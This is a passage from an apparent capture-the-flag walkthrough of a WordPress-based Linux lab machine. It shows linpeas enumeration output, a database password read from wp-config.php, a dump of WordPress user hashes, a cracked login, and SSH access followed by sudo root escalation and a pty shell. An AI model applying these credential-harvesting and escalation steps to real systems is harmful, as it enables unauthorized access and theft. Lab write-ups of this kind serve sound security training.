-rw-r--r-- 1 root root 4451 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 104 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 546 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.devicetable-offsets.h.cmd
-rw-r--r-- 1 root root 129 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 2537 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 3387 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 110 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 3755 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 4917 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 3362 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 3362 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 3342 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 146 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 340 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
grep: write error: Broken pipe

[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                        
-rw-r--r-- 1 root root 160 Mar 17  2017 /var/backups/dpkg.diversions.3.gz         
-rw-r--r-- 1 root root 1295 Mar 21  2017 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 199 Mar 21  2017 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 133775 Mar 21  2017 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 129437 Mar 17  2017 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 1369 Apr 26  2017 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 171 Mar 17  2017 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 469382 Apr 26  2017 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 171 Mar 17  2017 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 11 Mar 17  2017 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 1899 Mar 21  2017 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 199 Mar 21  2017 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 1277 Mar 17  2017 /var/backups/apt.extended_states.4.gz
-rw-r--r-- 1 root root 11984 Feb 21  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 43 Mar 17  2017 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 root root 450 Mar 21  2017 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 43 Mar 17  2017 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 171 Mar 17  2017 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 40960 Apr 26  2017 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 1795 Mar 17  2017 /var/backups/alternatives.tar.2.gz
-rw-r--r-- 1 root root 43 Mar 17  2017 /var/backups/dpkg.arch.3.gz
-rw-r--r-- 1 root root 130805 Mar 21  2017 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 1361 Mar 21  2017 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 207 Mar 17  2017 /var/backups/dpkg.statoverride.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
/dev/mqueue                                                                       
/dev/shm
/run/lock
/run/lock/apache2
/run/php
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/var/cache/apache2/mod_cache_disk
/var/cache/tcpdf
/var/lib/php/sessions
/var/tmp
/var/www
/var/www/.bash_history
/var/www/.gnupg
/var/www/.gnupg/gpg.conf
/var/www/.gnupg/pubring.gpg
/var/www/.gnupg/trustdb.gpg
/var/www/.nano
/var/www/.ssh
/var/www/.ssh/known_hosts
/var/www/html
/var/www/html/exploit
/var/www/html/linpeas.sh
/var/www/html/wordpress/wp-content/themes/twentyfourteen
/var/www/html/wordpress/wp-content/themes/twentyfourteen/404.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/archive.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/author.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/category.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/comments.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wordpress/wp-content/themes/twentyfourteen/css/editor-style.css
/var/www/html/wordpress/wp-content/themes/twentyfourteen/css/ie.css
/var/www/html/wordpress/wp-content/themes/twentyfourteen/featured-content.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/footer.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/functions.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/COPYING.txt
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/Genericons-Regular.otf
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/LICENSE.txt
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/README.txt
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.eot
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.ttf
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.woff
/var/www/html/wordpress/wp-content/themes/twentyfourteen/genericons/genericons.css
/var/www/html/wordpress/wp-content/themes/twentyfourteen/header.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/image.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/images
/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc
/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/back-compat.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/custom-header.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/customizer.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/featured-content.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/inc/template-tags.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wordpress/wp-content/themes/twentyfourteen/index.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/js
/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/customizer.js
/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/featured-content-admin.js
/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/functions.js
/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/html5.js
/var/www/html/wordpress/wp-content/themes/twentyfourteen/js/keyboard-image-navigation.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wordpress/wp-content/themes/twentyfourteen/languages
/var/www/html/wordpress/wp-content/themes/twentyfourteen/languages/twentyfourteen.pot
/var/www/html/wordpress/wp-content/themes/twentyfourteen/page-templates
/var/www/html/wordpress/wp-content/themes/twentyfourteen/page-templates/contributors.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/page-templates/full-width.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/page.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/rtl.css
/var/www/html/wordpress/wp-content/themes/twentyfourteen/search.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/sidebar-content.php
/var/www/html/wordpress/wp-content/themes/twentyfourteen/sidebar-footer.php
#)You_can_write_even_more_files_inside_last_directory

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
  Group www-data:                                                                 
/var/www/.nano                                                                    
/var/www/html/exploit
/var/www/html/linpeas.sh

[+] Searching passwords in config PHP files
                                                                                  
[+] Checking for TTY (sudo/su) passwords in audit logs
                                                                                  
[+] Finding IPs inside logs (limit 70)
      1 /var/log/wtmp:192.168.118.8                                               
      1 /var/log/lastlog:192.168.118.8

[+] Finding passwords inside logs (limit 70)
                                                                                  
[+] Finding emails inside logs (limit 70)
                                                                                  
[+] Finding *password* or *credential* files in home (limit 70)
                                                                                  
[+] Finding passwords inside key folders (limit 70) - only PHP files
./linpeas.sh: 3147: printf: %1$: invalid directive                                
/var/www/html/wordpress/wp-signup.php:          <?php printf( __( '<a href="http://

[+] Finding passwords inside key folders (limit 70) - no PHP files
./linpeas.sh: 3151: printf: %1$: invalid directive                                

[+] Finding possible password variables inside key folders (limit 140)
/var/www/html/upload/admins/settings/index.php:         'DATABASE_HOST'         => '',
/var/www/html/upload/admins/settings/index.php:         'DATABASE_NAME'         => '',
/var/www/html/upload/admins/settings/index.php:         'DATABASE_USERNAME' => '',
/var/www/html/upload/languages/CZ.php:  'APP_NAME'                              => 'Jméno aplikace',
/var/www/html/upload/languages/DE.php:  'APP_NAME'                              => 'Verwaltungswerkzeuge',
/var/www/html/upload/languages/DK.php:  'APP_NAME'                              => 'Applikationsnavn',
/var/www/html/upload/languages/EN.php:  'APP_NAME'                              => 'Application Name',
/var/www/html/upload/languages/FI.php:  'APP_NAME'                              => 'Sovelluksen nimi', //Application Name
/var/www/html/upload/languages/FR.php:  'APP_NAME'                              => 'Nom de l&apos;application',
/var/www/html/upload/languages/IT.php:  'APP_NAME'                              => 'Nome Applicazione',
/var/www/html/upload/languages/NL.php:  'APP_NAME'                              => 'Applicatienaam',
/var/www/html/upload/languages/PL.php:'APP_NAME' =>  'Nazwa aplikacji',
/var/www/html/upload/languages/RU.php:  'APP_NAME'                              => 'Название приложения',
/var/www/html/upload/modules/edit_area/edit_area/langs/bg.js:accesskey: "Бърз клавиш",
/var/www/html/upload/modules/edit_area/edit_area/langs/cs.js:accesskey: "Přístupová klávesa",
/var/www/html/upload/modules/edit_area/edit_area/langs/de.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/dk.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/en.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/eo.js:accesskey: "Fulmoklavo",
/var/www/html/upload/modules/edit_area/edit_area/langs/es.js:accesskey: "Tecla de acceso",
/var/www/html/upload/modules/edit_area/edit_area/langs/fi.js:accesskey: "Pikanäppäin",
/var/www/html/upload/modules/edit_area/edit_area/langs/fr.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/hr.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/it.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/ja.js:accesskey: "アクセスキー",
/var/www/html/upload/modules/edit_area/edit_area/langs/mk.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/nl.js:accesskey: "Accessknop",
/var/www/html/upload/modules/edit_area/edit_area/langs/pl.js:accesskey: "Alt+",
/var/www/html/upload/modules/edit_area/edit_area/langs/pt.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/ru.js:accesskey: "Горячая клавиша",
/var/www/html/upload/modules/edit_area/edit_area/langs/sk.js:accesskey: "Accesskey",
/var/www/html/upload/modules/edit_area/edit_area/langs/zh.js:accesskey: "快捷键",
/var/www/html/upload/modules/edit_area/edit_area/template.html:                  {$accesskey} E: {$toggle}<br />
/var/www/html/upload/modules/tiny_mce_4/templates/tiny_mce.lte:   filemanager_access_key:"{{ LEPTON_GUID }}" ,
/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config.php: 'access_keys' => array( LEPTON_GUID ),
/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config.php:| filemanager_access_key:"myPrivateKey" ,
/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config_sik.php:       'access_keys' => array( LEPTON_GUID ),
/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config_sik.php:| filemanager_access_key:"myPrivateKey" ,
/var/www/html/upload/modules/tiny_mce_4/tiny_mce/filemanager/dialog.php:if (USE_ACCESS_KEYS == TRUE){                                                               
/var/www/html/upload/templates/algos/templates/settings.htt:                     <input type="text" name="app_name" value="{APP_NAME}" />
/var/www/html/upload/templates/lepton2/index.php:                       <label for="password" accesskey="2"><?php echo $TEXT['PASSWORD']; ?>:</label>
/var/www/html/upload/templates/lepton2/index.php:                       <label for="username" accesskey="1">
/var/www/html/wordpress/wp-admin/includes/ms.php:       $new_admin_email = array(
/var/www/html/wordpress/wp-admin/includes/schema.php:           'admin_email' => $site_user->user_email,
/var/www/html/wordpress/wp-admin/includes/schema.php:   'admin_email' => 'you@example.com',
/var/www/html/wordpress/wp-admin/install.php:           $admin_email  = isset( $_POST['admin_email']  ) ?trim( wp_unslash( $_POST['admin_email'] ) ) : '';
/var/www/html/wordpress/wp-admin/install.php:   $admin_email  = isset( $_POST['admin_email']  ) ? trim( wp_unslash( $_POST['admin_email'] ) ) : '';
/var/www/html/wordpress/wp-admin/options-general.php:$new_admin_email = get_option( 'new_admin_email' );
/var/www/html/wordpress/wp-admin/options-general.php:if ( $new_admin_email && $new_admin_email != get_option('admin_email') ) : ?>
/var/www/html/wordpress/wp-admin/options.php:   } elseif ( ! empty( $_GET['dismiss'] ) && 'new_admin_email' == $_GET['dismiss'] ) {
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:      $api_key = Akismet::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:      $api_key = array_shift( $responses[0] );
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:      'api_key'          => $api_key,
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:      $api_key      = Akismet::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet-admin.php:      if ( $api_key = Akismet::get_api_key() ) {
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php:           $api_key   = self::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/class.akismet.php:           $api_key = self::get_api_key();
/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php:             <?php if ( !defined( 'WPCOM_API_KEY' ) ):?>
/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php:             <?php if ( !defined( 'WPCOM_API_KEY' ) ):?>
/var/www/html/wordpress/wp-content/plugins/akismet/wrapper.php:$wpcom_api_key    = defined( 'WPCOM_API_KEY' ) ? constant( 'WPCOM_API_KEY' ) : '';
/var/www/html/wordpress/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php:          $this->__accessKey = $accessKey;
/var/www/html/wordpress/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php:          $this->__secretKey = $secretKey;
/var/www/html/wordpress/wp-content/plugins/mail-masta/amazon_api/SimpleEmailService.php:          if ($accessKey !== null && $secretKey !== null) {
/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/api_settings_ajax.php: $access_key = $_POST['a'];
/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/autoresponder/api_settings_ajax.php: $access_key = $_POST['a'];
/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/mail-settings-data.php:var accesskey = jQuery("#access_key").val();
/var/www/html/wordpress/wp-content/plugins/mail-masta/inc/mail-settings-data.php:var secretkey = jQuery("#secret_key").val();
/var/www/html/wordpress/wp-includes/js/quicktags.js:            var access = this.access ? ' accesskey="' + this.access + '"' : '';
/var/www/html/wordpress/wp-includes/media.php:                  $img_url = str_replace($img_url_basename, wp_basename($thumb_file), $img_url);
/var/www/html/wordpress/wp-includes/media.php:          $img_url = str_replace($img_url_basename, $intermediate['file'], $img_url);

[+] Finding possible password in config files
 /etc/debconf.conf                                                                
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/adduser.conf
passwd
 /etc/phpmyadmin/lighttpd.conf
passwd"
passwd.userfile = "/etc/phpmyadmin/htpasswd.setup"
 /etc/phpmyadmin/apache.conf
passwd.setup
 /etc/apache2/apache2.conf
passwd files from being
 /etc/init/passwd.conf
passwd - clear locks on passwd and related files
passwd to avoid million duplicate bug reports
passwd locks"
passwd.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock
 /etc/nsswitch.conf
passwd:         compat
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,

[+] Finding 'username' string inside key folders (limit 70)
/var/www/html/upload/account/login.php: "MAX_USERNAME_LEN" => AUTH_MAX_LOGIN_LENGTH,
/var/www/html/upload/account/login.php: "MIN_USERNAME_LEN" => AUTH_MIN_LOGIN_LENGTH,
/var/www/html/upload/account/login.php:  "USERNAME_FIELDNAME" => $TEXT['USERNAME'],
/var/www/html/upload/account/login_form.php:    'TEXT_USERNAME' =>      $TEXT['USERNAME'],                                                                          
/var/www/html/upload/account/logout.php:$_SESSION['USERNAME'] = null;
/var/www/html/upload/account/signup2.php:               $database->query("DELETE FROM ".TABLE_PREFIX."users WHERE username = '$username'");
/var/www/html/upload/account/signup2.php:$results = $database->query("SELECT user_id FROM ".TABLE_PREFIX."users WHERE username = '$username'");
/var/www/html/upload/account/signup2.php:$username = strtolower(strip_tags($wb->get_post_escaped('username')));
/var/www/html/upload/account/signup_form.php:   'TEXT_USERNAME'         =>      $TEXT['USERNAME'],
/var/www/html/upload/account/templates/login_form.htt:          <input type="text" name="{TEXT_USERNAME}" maxlength="30" style="width:220px;"/>
/var/www/html/upload/account/templates/login_form.htt:  <td style="width:100px">{TEXT_USERNAME}:</td>
/var/www/html/upload/account/templates/login_form.htt:<input type="hidden" name="username_fieldname" value="{TEXT_USERNAME}" />                                     
/var/www/html/upload/account/templates/signup_form.htt:                         <input type="text" name="username" maxlength="30" style="width:300px;"/>
/var/www/html/upload/account/templates/signup_form.htt:                 <td width="180">{TEXT_USERNAME}:</td>
/var/www/html/upload/admins/groups/groups.php:                          'TEXT_USERNAME' => $TEXT['USERNAME'],                                                       
/var/www/html/upload/admins/groups/index.php:   'TEXT_USERNAME' => $TEXT['USERNAME'],
/var/www/html/upload/admins/login/index.php:    $username_fieldname = 'username_'.substr($salt, 0, 7);
/var/www/html/upload/admins/login/index.php:    'MAX_USERNAME_LEN' => AUTH_MAX_LOGIN_LENGTH,
/var/www/html/upload/admins/login/index.php:    'MIN_USERNAME_LEN' => AUTH_MIN_LOGIN_LENGTH,
/var/www/html/upload/admins/login/index.php:    'USERNAME_FIELDNAME' => $username_fieldname,
/var/www/html/upload/admins/logout/index.php:$_SESSION['USERNAME'] = null;
/var/www/html/upload/admins/pages/modify.php:                   'MODIFIED_BY_USERNAME' => $user['username'],                                                        
/var/www/html/upload/admins/pages/sections.php:                 'MODIFIED_BY_USERNAME' => $user['username'],                                                        
/var/www/html/upload/admins/pages/settings.php:         'MODIFIED_BY_USERNAME' => $user['username'],
/var/www/html/upload/admins/preferences/index.php:              'TEXT_USERNAME'            => $TEXT['USERNAME'],
/var/www/html/upload/admins/settings/index.php:         'DATABASE_USERNAME' => '',
/var/www/html/upload/admins/settings/save.php:                $settings['wbmailer_smtp_username'] = $wbmailer_smtp_username;
/var/www/html/upload/admins/settings/save.php:            if (($wbmailer_smtp_username == '') && !preg_match($pattern, $wbmailer_smtp_username))                    
/var/www/html/upload/admins/settings/setting.js:                        document.getElementById('row_wbmailer_smtp_username').style.display = '';
/var/www/html/upload/admins/settings/setting.js:                        document.getElementById('row_wbmailer_smtp_username').style.display = 'none';
/var/www/html/upload/admins/settings/setting.js:                document.getElementById('row_wbmailer_smtp_username').style.display = '';
/var/www/html/upload/admins/settings/setting.js:                document.getElementById('row_wbmailer_smtp_username').style.display = 'none';
/var/www/html/upload/admins/users/add.php:      'username'      => addslashes($username),                                                                           
/var/www/html/upload/admins/users/add.php:$_SESSION['au']['username'] = $username;
/var/www/html/upload/admins/users/add.php:$results = $database->query("SELECT user_id FROM ".TABLE_PREFIX."users WHERE username = '$username'");
/var/www/html/upload/admins/users/add.php:$username = strtolower($admin->get_post_escaped($username_fieldname));
/var/www/html/upload/admins/users/add.php:$username_fieldname = $admin->get_post_escaped('username_fieldname');
/var/www/html/upload/admins/users/index.php:    $username_fieldname .= $salt[ $num ];
/var/www/html/upload/admins/users/index.php:    'TEXT_USERNAME' => $TEXT['USERNAME'],
/var/www/html/upload/admins/users/index.php:    'USERNAME_FIELDNAME' => $username_fieldname,
/var/www/html/upload/admins/users/index.php:$username = (isset($_SESSION['au']['username'])) ? $_SESSION['au']['username'] : '';                                    
/var/www/html/upload/admins/users/index.php:$username_fieldname = 'username_';
/var/www/html/upload/admins/users/save.php:$username = $admin->get_post_escaped( $username_fieldname );                                                             
/var/www/html/upload/admins/users/save.php:if ($username != 'admin') $fields[ 'username' ] = $username;                                                             
/var/www/html/upload/admins/users/users.php:                    'USERNAME' => $user['username'],
/var/www/html/upload/admins/users/users.php:            'TEXT_USERNAME' => $TEXT['USERNAME'],                                                                       
/var/www/html/upload/admins/users/users.php:            'USERNAME_FIELDNAME' => $username_fieldname,                                                                
/var/www/html/upload/admins/users/users.php:    $username_fieldname = 'username_'. random_string( AUTH_MIN_PASS_LENGTH + mt_rand(0, 4), 'pass' );
/var/www/html/upload/framework/class.admin_phplib.php:            $user['username']     = 'unknown';
/var/www/html/upload/framework/class.admin_twig.php:            $user['username']     = 'unknown';
/var/www/html/upload/framework/class.login.php:                                 'MAX_USERNAME_LEN' => $this->max_username_len,
/var/www/html/upload/framework/class.login.php:                                 'TEXT_USERNAME' => $TEXT['USERNAME'],
/var/www/html/upload/framework/class.login.php:                                 'USERNAME' => $this->username,                                                      
/var/www/html/upload/framework/class.login.php:                                 'USERNAME_FIELDNAME' => $this->username_fieldname,                                  
/var/www/html/upload/framework/class.login.php:                 $_SESSION['USERNAME'] = $results_array['username'];                                                 
/var/www/html/upload/framework/class.login.php:                 $this->username_len = strlen($this->username);
/var/www/html/upload/framework/class.login.php:                 $username_fieldname = $this->get_post('username_fieldname');
/var/www/html/upload/framework/class.login.php:                 $username_fieldname = 'username';
/var/www/html/upload/framework/class.login.php:         $loginname = ( preg_match('/[\;\=\&\|\<\> ]/',$this->username) ? '' : $this->username );
/var/www/html/upload/framework/class.login.php:         $this->max_username_len = AUTH_MIN_LOGIN_LENGTH;
/var/www/html/upload/framework/class.login.php:         $this->username = htmlspecialchars (strtolower($this->get_post($username_fieldname)), ENT_QUOTES);
/var/www/html/upload/framework/class.login.php:         if ($this->get_post('username_fieldname') != ''){                                                           
/var/www/html/upload/framework/class.login.php:         if($this->get_post($username_fieldname) != '') {                                                            
/var/www/html/upload/framework/class.login.php:         } elseif($this->username == '' AND $this->password == '') {
/var/www/html/upload/framework/class.login.php:         } elseif($this->username == '') {
/var/www/html/upload/framework/class.login.php: private $username_fieldname = "";
/var/www/html/upload/framework/class.login.php: public $max_username_len = 3;   //see [1];
/var/www/html/upload/framework/class.wb.php:            return isset( $_SESSION[ 'USERNAME' ] ) ? $_SESSION[ 'USERNAME' ] : '';                                     
/var/www/html/upload/framework/class.wbmailer.php:                              $this->Username = WBMAILER_SMTP_USERNAME; // set SMTP username
/var/www/html/upload/languages/CZ.php:  'LOGIN_USERNAME_BLANK'  => 'Zadejte uživateslké jméno',

[+] Searching specific hashes inside files - less false positives (limit 70)
```

```
cat wp-config.php
```

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

```



```mysql
mysql -u root -p
rootpassword!
```

```mysql
use wordpress;
select * from wp_user;
mysql> select * from wp_users;
select * from wp_users;
+----+------------+----------------------------------+---------------+-------------------+----------+-----------------------------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+-----------------------------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+-----------------------------------------+-------------+--------------+
2 rows in set (0.00 sec)

```

解密得到btrisk:roottoor

```
ssh btrisk@192.168.195.50
sudo -l
sudo passwd root 
sudo python3 -c 'import pty; pty.spawn ("/bin/bash")'
```


